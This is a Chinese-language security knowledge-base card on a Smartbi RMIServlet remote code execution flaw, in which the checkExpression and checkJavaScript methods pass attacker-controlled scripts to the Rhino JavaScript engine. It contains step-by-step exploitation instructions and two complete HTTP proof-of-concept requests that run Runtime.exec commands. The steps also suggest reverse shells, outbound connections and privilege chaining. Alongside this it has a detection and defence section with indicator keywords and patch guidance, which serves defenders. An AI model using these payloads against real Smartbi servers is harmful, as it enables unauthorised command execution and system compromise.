---
id: web-java-component-smartbi-rmiservlet-js-rhino-expression-rce
title: Smartbi RMIServlet 服务端 JS/Rhino 表达式执行：checkExpression 与 checkJavaScript 命令执行
type: scenario
domain: web
path: web/java/component
technique: smartbi-rmiservlet-js-rhino-expression-rce
tags:
- smartbi
- java
- expression-injection
- javascript
- rhino
- rmi-servlet
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V36
  verified_at: '2026-11-05T06:08:57+08:00'
  notes: 已对照原文与61张图核对：MetricsModelForVModule#checkExpression 直接执行表达式、AugmentedDataSetForVModule#checkJavaScript→JSViewBO#init→initInner 执行 Rhino、修复为函数权限+纯数字校验，均与卡片一致。未验证点：原文只有 PoC 请求无执行结果截图，卡片已注明；未本机复现，confidence=medium 合理。
url: /docs/web/java/component/web-java-component-smartbi-rmiservlet-js-rhino-expression-rce/
draft: false
kb_aliases:
- Smartbi checkExpression
- Smartbi checkJavaScript
- Smartbi 表达式注入
- Rhino 表达式执行
- MetricsModelForVModule
- AugmentedDataSetForVModule
---

## 一句话结论

Smartbi 的 `RMIServlet` 可以反射调用 `MetricsModelForVModule#checkExpression` 与 `AugmentedDataSetForVModule#checkJavaScript` 两个方法；两者分别把请求参数中的表达式字符串/`define.javaScript` 交给服务端 JavaScript/Rhino 引擎执行，而引擎暴露 Java 互操作能力，因此传入 `java.lang.Runtime.getRuntime().exec(...)` 即可在 Smartbi 进程内执行任意命令。修复前这两处对调用者权限限制不足。

## 原理

- **统一入口**：`/smartbi/vision/RMIServlet` 根据 `className`/`methodName`/`params` 反射调用已注册 Service 方法，因此只要目标方法存在且通过鉴权，就能从 HTTP 层触达。
- **checkExpression**：`smartbix.smartbi.metricsmodel.MetricsModelForVModule#checkExpression` 接收一个表达式字符串并交给 JS 引擎执行。它没有对表达式做语法/能力限制，也没有校验调用者是否具备指标管理权限；攻击者直接传入 Java 互操作表达式即可执行命令。
- **checkJavaScript**：`smartbix.smartbi.AugmentedDataSetForVModule#checkJavaScript` 接收一个 view JSON；`JSViewBO#init` 从 JSON 的 `define` 中取出 `javaScript` 字段，`initInner` 将其交给 Rhino 执行。Rhino 默认允许访问 Java 类，因此 `java.lang.Runtime.getRuntime().exec(...)` 可直接调用。
- **为什么能 RCE**：这类 JS 引擎本意是执行受限的指标/数据集脚本，但实现使用带 Java 互操作的引擎（Rhino/JS 引擎），且没有类白名单、沙箱或 `ClassShutter`。一旦攻击者控制脚本内容，就能通过 `java.lang.*`、`Packages` 等访问宿主 JVM，执行系统命令。
- **权限边界**：原文指出这两处原本允许“任意用户/任意权限用户”调用；补丁后 `checkExpression` 要求 `METRICS_METRIC_MANAGER` 函数权限并把表达式限制为纯数字，`checkJavaScript` 增加对应权限校验。这说明漏洞的核心之一是功能级权限缺失，而不仅是表达式过滤缺失。

## 触发条件

- 目标暴露 `/smartbi/vision/RMIServlet`，且 `MetricsModelForVModule`/`AugmentedDataSetForVModule` 已注册为可调用 Service。
- 版本/补丁未对这两个方法增加函数权限校验，或攻击者拥有可调用它们的低权限账号/会话。
- 服务端 JS 引擎启用 Java 互操作（Rhino 默认具备；若配置了 `ClassShutter` 白名单则可能受限）。
- 请求中的 `params` 结构与目标方法签名匹配（`checkExpression` 为字符串数组；`checkJavaScript` 为包含 `define.javaScript` 的对象数组）。

## 利用步骤

1. 获取有效会话（低权限账号即可；V11 需先通过登录或其它鉴权绕过取得 Cookie）。
2. 调用 `checkExpression`，`params` 传入 `["java.lang.Runtime.getRuntime().exec('id')"]`，观察命令是否执行/回显。
3. 若 `checkExpression` 被补丁限制，改用 `checkJavaScript`：构造 `params=[{"define":{"javaScript":"java.lang.Runtime.getRuntime().exec('id')"}}]`。
4. 命令无直接回显时，改用写文件、外连、反弹 Shell 或延时/侧信道确认执行；按目标环境选择 `exec` 的字符串数组形式避免空格解析问题。
5. 修复后需具备 `METRICS_METRIC_MANAGER` 等对应权限才能调用；评估是否可通过其它 Service 方法或权限提升链取得。

## PoC

`checkExpression`：

```http
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: target
Cookie: JSESSIONID=<有效会话>
Content-Type: application/x-www-form-urlencoded

className=MetricsModelForVModule&methodName=checkExpression&params=["java.lang.Runtime.getRuntime().exec('calc')"]
```

`checkJavaScript`（Rhino）：

```http
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: target
Cookie: JSESSIONID=<有效会话>
Content-Type: application/x-www-form-urlencoded

className=AugmentedDataSetForVModule&methodName=checkJavaScript&params=[{"define":{"javaScript":"java.lang.Runtime.getRuntime().exec('calc')"}}]
```

原文用 `calc` 作为验证命令；实际测试可换成 `id`、写文件或外连命令。两条请求都依赖目标已注册对应 Service 且当前会话未被权限校验拦截。

## 变体与关联

- 变体（表达式承载）：`checkExpression` 可直接传字符串；`checkJavaScript` 需要嵌在 view JSON 的 `define.javaScript` 中；其它 Service 方法若把用户输入交给 JS/表达式引擎，也可用同一思路。
- 变体（引擎能力）：Rhino 的 `java.lang.*`、`Packages.*`、`Java.type` 等 Java 互操作入口均可尝试；若目标使用 Nashorn，语法类似。
- 变体（权限）：修复后需 `METRICS_METRIC_MANAGER` 等权限；可结合任意用户登录、会话伪造或其它越权链取得高权限会话。
- 关联：[[web-java-component-smartbi-rmiservlet-db2-jdbc-jndi-rce]]（同一 RMIServlet 反射分发入口的另一类 sink）。
- 关联：[[web-java-component-jimureport-unauth-aviator-rce]]、[[web-java-component-syncope-connector-script-rce]]（同类“表达式/脚本引擎 + Java 互操作 → RCE”）。
- 关联：[[web-java-expression-spel-injection-to-rce]]（表达式注入到 RCE 的通用模式；本卡是 JavaScript/Rhino 引擎而非 SpEL）。
- 边界：若目标禁用 Java 互操作、配置 `ClassShutter` 白名单或使用纯解释型受限引擎，直接 `java.lang.Runtime` 可能失败；补丁后无对应权限也无法调用。

## 检测与防御

- 修复：为 `checkExpression`/`checkJavaScript` 增加函数级权限校验；`checkExpression` 只允许纯数字/预期表达式；不要在服务端执行用户可控脚本。
- 引擎加固：使用带 `ClassShutter`/类白名单的 Rhino 配置，禁用 `java`、`Packages`、`Java.type` 等互操作入口；优先用受限 DSL 替代通用 JS 引擎。
- 入口加固：`RMIServlet` 对 `className`/`methodName` 做白名单，禁止低权限用户调用管理类 Service 方法。
- 检测：RMIServlet 请求中出现 `MetricsModelForVModule`、`AugmentedDataSetForVModule`、`checkExpression`、`checkJavaScript`；`params` 含 `java.lang.Runtime`、`getRuntime`、`exec`、`ProcessBuilder`、`Packages`；Smartbi 进程异常派生子进程。
- 运营：升级到包含对应补丁的版本；审计所有接受表达式/脚本的 Service 方法，确认均有权限校验与引擎沙箱。
